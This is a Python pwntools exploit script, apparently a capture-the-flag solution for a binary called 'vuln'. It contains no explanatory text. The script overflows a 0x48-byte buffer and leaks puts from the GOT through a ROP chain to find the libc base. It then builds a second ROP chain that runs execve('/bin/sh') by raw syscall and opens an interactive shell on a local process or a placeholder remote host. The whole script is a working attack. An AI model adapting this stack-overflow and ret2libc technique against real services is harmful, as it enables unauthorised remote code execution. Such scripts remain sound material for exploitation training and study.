#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("addr", 1337)

	return r


def main():
	r = conn()
	gdb.attach(r)

	# good luck pwning :)

	p_rdi =	0x4011bb

	payload = b"A"*0x48
	payload += p64(p_rdi)
	payload += p64(exe.got["puts"])
	payload += p64(exe.symbols["puts"])
	payload += p64(exe.symbols["main"])

	r.recv()
	r.sendline(payload)

	leak = r.recvline()[:-1]
	leak = int.from_bytes(leak, byteorder='little')
	print(hex(leak))

	libc.address = leak - 0x72230
	
	p_rsi = libc.address + 0x2590f
	p_rdx = libc.address + 0xc770d
	p_rax = libc.address + 0x3be88
	syscall = libc.address + 0x550da
	bash_addr = next(libc.search(b"/bin/sh\0"))

	payload = b"A"*0x48
	payload += p64(p_rdi)
	payload += p64(bash_addr)
	payload += p64(p_rsi)
	payload += p64(0)
	payload += p64(p_rdx)
	payload += p64(0)
	payload += p64(p_rax)
	payload += p64(0x3b)
	payload += p64(syscall)

	r.sendline(payload)


	r.interactive()


if __name__ == "__main__":
	main()
